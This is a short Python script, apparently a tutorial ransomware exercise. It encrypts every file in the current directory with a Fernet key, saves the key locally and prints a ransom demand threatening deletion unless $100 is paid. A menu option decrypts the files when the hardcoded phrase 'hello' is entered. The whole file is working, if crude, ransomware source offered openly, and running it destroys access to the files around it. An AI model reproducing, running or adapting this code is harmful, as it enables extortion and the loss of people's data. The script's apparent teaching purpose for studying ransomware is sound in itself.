from cryptography.fernet import Fernet
import os


files = []

for path in os.listdir():
    if (path == "main.py" or path == "encryptedKey.key" or path == "decrypt.py"):
        continue    
    if os.path.isfile(path):
        files.append(path)

# Ask user to Choose an option: \n1. Encrypt \n2.Decrypt \n and save the integer user input to choice variable
choice =  int(input("Choose an option: \n1. Encrypt \n2.Decrypt \n"))

# Check if choice is equal to 1 and run the Encryption code
if (choice == 1):
    
    # Perform the Encryption code under if block
    key = Fernet.generate_key()
    
    with open("encryptedKey.key", "wb") as encryptedKey:
        encryptedKey.write(key)

    for file in files:
        with open(file, "rb") as file1:
            rawData = file1.read()
        
        encryptedRawData = Fernet(key).encrypt(rawData)

        with open(file, "wb") as file2:
            file2.write(encryptedRawData)

    print("👹👹👹👹 All of your files has been encrypted send me $100 or I'll delete them in 24 hours!! 👹👹👹👹")

# Check if choice is 2 and run the decryption code
if (choice ==2):
    # Create variable secretePhrase and store the value "hello" or any other
    secretPhrase = "hello"

    # Ask user to enter the valid phrase to decrypt the files
    enteredPhrase = input("Enter valid phrase to decrypt the files\n")

    # Check if secretPhrase do not match with the enteredPhrase
    if (secretPhrase != enteredPhrase):
        # Print " 👹👹👹👹 Invalid Phrase try one more time or Pay me more 👹👹👹👹 "
        print(" 👹👹👹👹 Invalid Phrase try one more time or Pay me more 👹👹👹👹 ")
    # Else:
    else:
        # Add try block
        try:
            # Read the encryptedKey.key file and store the content in secretKey variable.
            with open("encryptedKey.key", "rb") as encryptedKey:
                secretKey = encryptedKey.read()

            # Iterate the loop over the files list
            for file in files:
                # Open the file in rb mode and store the content in rawData variable
                with open(file, "rb") as theFile:
                    rawData = theFile.read()
                # Use Fernet(secretKey).decrypt(rawData) to decrypt and store the result in decryptRawData variable
                decryptedRawData = Fernet(secretKey).decrypt(rawData)

                # Update the same file with decrypted data
                with open(file, "wb") as theFile:
                    theFile.write(decryptedRawData)

            # Notify the message to the user "You have successfully recovered all the files!!"
            print("You have successfully recovered all the files!!")
        # Except pass 
        except:
            pass
  